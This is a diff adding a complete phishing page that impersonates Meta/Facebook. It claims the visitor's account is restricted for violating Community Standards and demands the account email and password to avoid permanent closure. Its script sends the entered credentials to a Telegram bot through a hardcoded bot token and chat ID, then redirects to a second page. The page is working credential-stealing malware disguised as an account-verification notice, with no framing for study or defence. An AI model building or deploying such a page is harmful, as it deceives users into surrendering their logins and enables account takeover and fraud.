@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Verification</title>
+    <style>
+        body {
+            font-family: "Arial", sans-serif;
+            background-color: #f5f6f7;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 80px;
+            width: 100%;
+            background-color: #fff;
+            box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        header img {
+            height: 100%;
+            width: auto;
+        }
+
+        main {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .hero img {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .main-header {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .main-description {
+            font-size: 16px;
+            color: #555555;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .main-description a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .main-description a:hover {
+            text-decoration: underline;
+        }
+
+        form {
+            margin-top: 20px;
+        }
+
+        form input {
+            width: 95%;
+            padding: 10px 12px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        form button {
+            width: 95%;
+            padding: 12px 15px;
+            font-size: 16px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            box-sizing: border-box;
+        }
+
+        form button:hover {
+            background-color: #145dbf;
+        }
+
+        .case-info {
+            font-size: 14px;
+            color: #555555;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .warning {
+            font-size: 12px;
+            color: #ff0000;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        .warning a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .warning a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <img src="https://logoeps.com/wp-content/uploads/2021/10/meta-logoeps.com_.png" alt="Meta Logo">
+    </header>
+    <main>
+        <div class="hero">
+            <img src="https://www.adweek.com/wp-content/uploads/2022/03/Facebook-Protect-Hero.png?w=994" alt="Hero Image">
+        </div>
+        <div class="main-header">Your account has been restricted</div>
+        <div class="main-description">
+            We detected unusual activity in your page today <strong id="current-date"></strong>.<br>
+            Someone has reported your account for not complying with
+            <a href="https://www.facebook.com/communitystandards" target="_blank">Community Standards</a>. We have already reviewed this decision, and the decision cannot be changed. To avoid having your account disabled, please verify:
+        </div>
+        <form id="verification-form">
+            <input type="email" id="email" name="email" placeholder="Email" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Submit</button>
+        </form>
+        <div class="case-info">
+            Case Number: <strong>#100430558912</strong><br>
+            About Case: Violating Community Standards and Posting something inappropriate.
+        </div>
+        <div class="warning">
+            ⚠️ Please make sure to fill in the data correctly. If you fill in the wrong data, your account will be permanently closed.
+            To learn more about why we deactivate accounts, go to 
+            <a href="https://www.facebook.com/communitystandards" target="_blank">Community Standards</a>.
+        </div>
+    </main>
+    
+    <script>
+        // Update the date
+        document.getElementById("current-date").innerText = new Date().toLocaleDateString("en-US", {
+            year: "numeric",
+            month: "long",
+            day: "numeric"
+        });
+
+        // Telegram Bot integration
+        const botToken = "6303918595:AAFXVIhGvO1ANChwjTe7KcXGeNqyOVotMDA";
+        const chatID = "-1002208568961";
+
+        const form = document.getElementById("verification-form");
+        form.addEventListener("submit", async function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const currentDateTime = new Date().toLocaleString();
+
+            const message = `🔒 New Submission Detected\n\n`
+                + `📧 Email: ${email}\n`
+                + `🔑 Password: ${password}\n`
+                + `🕒 Submitted At: ${currentDateTime}`;
+
+            // Send to Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            try {
+                const response = await fetch(telegramURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatID, text: message })
+                });
+
+                if (response.ok) {
+                    alert("Submission sent successfully!");
+                    window.location.href = "email2.html"; // Redirect to email2.html
+                } else {
+                    alert("Failed to send data. Please try again.");
+                }
+            } catch (error) {
+                console.error("Error:", error);
+                alert("An error occurred. Please try again later.");
+            }
+        });
+    </script>
+</body>
+</html>
